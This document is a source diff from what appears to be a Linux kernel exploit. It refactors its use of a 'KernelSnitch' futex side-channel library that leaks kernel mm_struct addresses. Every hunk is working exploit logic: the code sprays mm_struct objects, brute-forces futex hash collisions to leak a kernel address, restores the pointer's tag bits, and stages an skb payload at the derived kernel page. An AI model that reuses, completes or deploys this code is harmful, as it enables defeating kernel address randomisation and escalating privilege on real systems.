@@ -3,7 +3,7 @@
 #include "target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
-static struct kernelsnitch_shared_state *ks;
+static KernelSnitchContext *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
 static int reclaim_sv[2] = {-1, -1};
@@ -78,38 +78,37 @@ int kernel5_route_selected(void) {
          active_offsets->mcast_waiter_off > 0;
 }
 
-/* Decoupling plan: allocate the address-discovery engine. Inputs: profile/hash
- * configuration; output: initialized context. Future:
- * kernelsnitch_context_init(KernelSnitchContext *, ...). */
+/* Allocate the address-discovery engine. Inputs: resolved profile geometry and
+ * runtime CPU count; output: the owned mmap-backed KernelSnitchContext. */
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_setup(
+  ks = kernelsnitch_context_init(
       mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
 }
 
-/* Decoupling plan: query discovered collisions. Input: snitch context; output:
- * boolean. Future: kernelsnitch_context_is_ready(const context *). */
+/* Query discovered collisions. Input: immutable snitch context; output:
+ * boolean collision readiness. */
 int kernelsnitch_collisions_ready(void) {
-  return kernelsnitch_found_collisions(ks);
+  return kernelsnitch_context_has_collisions(ks);
 }
 
-/* Decoupling plan: advance collision discovery. Input/output: snitch context;
- * future: kernelsnitch_context_scan(KernelSnitchContext *). */
+/* Advance collision discovery into address scanning. Input/output: owned
+ * snitch context; output is retained in the context result state. */
 void run_kernelsnitch_bruteforce(void) {
-  kernelsnitch_bruteforce(ks);
+  (void)kernelsnitch_context_scan(ks);
 }
 
-/* Decoupling plan: obtain the selected mm_struct candidate. Input: const snitch
- * context; output: kernel address. Future: kernelsnitch_context_result(). */
+/* Obtain the selected mm_struct candidate. Input: immutable snitch context;
+ * output: kernel address or -1. */
 uintptr_t current_kernelsnitch_mm_struct(void) {
-  return ks->mm_struct;
+  return kernelsnitch_context_result(ks);
 }
 
-/* Decoupling plan: stop workers and release discovery state. Input: snitch
- * context; output: retained result address. Future: split result() and
- * kernelsnitch_context_destroy(). */
+/* Retain the result, destroy the owned snitch context and clear the compatibility
+ * owner. Input: current context; output: kernel address or -1. */
 uintptr_t cleanup_kernelsnitch(void) {
-  uintptr_t leaked = kernelsnitch_cleanup(ks);
+  uintptr_t leaked = kernelsnitch_context_result(ks);
+  kernelsnitch_context_destroy(ks);
   ks = NULL;
   return leaked;
 }
@@ -322,7 +321,7 @@ pid_t clone_child(void) {
 pid_t clone_leak_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
-    kernelsnitch_find_collisions(ks);
+    kernelsnitch_context_find_collisions(ks);
     exit(0);
   }
   return child;
@@ -669,7 +668,7 @@ uintptr_t prepare_kernel_page(void) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_setup(
+  ks = kernelsnitch_context_init(
       mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
@@ -743,9 +742,9 @@ uintptr_t prepare_kernel_page(void) {
       pr_warning("leak child exit status=%d\n", leak_status);
     }
   }
-  if (!kernelsnitch_found_collisions(ks)) {
+  if (!kernelsnitch_context_has_collisions(ks)) {
     pr_warning("[spray] futex collisions not found\n");
-    kernelsnitch_cleanup(ks);
+    kernelsnitch_context_destroy(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
@@ -756,10 +755,10 @@ uintptr_t prepare_kernel_page(void) {
 
   pr_info("[spray] futex collisions found +%lldms\n",
           ms_since(&t_spray));
-  kernelsnitch_bruteforce(ks);
+  (void)kernelsnitch_context_scan(ks);
   pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
-          (size_t)ks->mm_struct, ms_since(&t_spray));
-  uintptr_t leaked = ks->mm_struct;
+          kernelsnitch_context_result(ks), ms_since(&t_spray));
+  uintptr_t leaked = kernelsnitch_context_result(ks);
   /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
   leaked |= (uintptr_t)0xf << 56;
   last_mm_struct = leaked;
@@ -768,7 +767,7 @@ uintptr_t prepare_kernel_page(void) {
       leaked < KERNELSNITCH_IDENTITY_START ||
       leaked >= g_direct_map_end) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
-    kernelsnitch_cleanup(ks);
+    kernelsnitch_context_destroy(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
@@ -779,7 +778,7 @@ uintptr_t prepare_kernel_page(void) {
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   if (!prepare_skb_payload(base)) {
-    kernelsnitch_cleanup(ks);
+    kernelsnitch_context_destroy(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
@@ -844,7 +843,7 @@ uintptr_t prepare_kernel_page(void) {
     }
   }
   pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
-  kernelsnitch_cleanup(ks);
+  kernelsnitch_context_destroy(ks);
   ks = NULL;
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
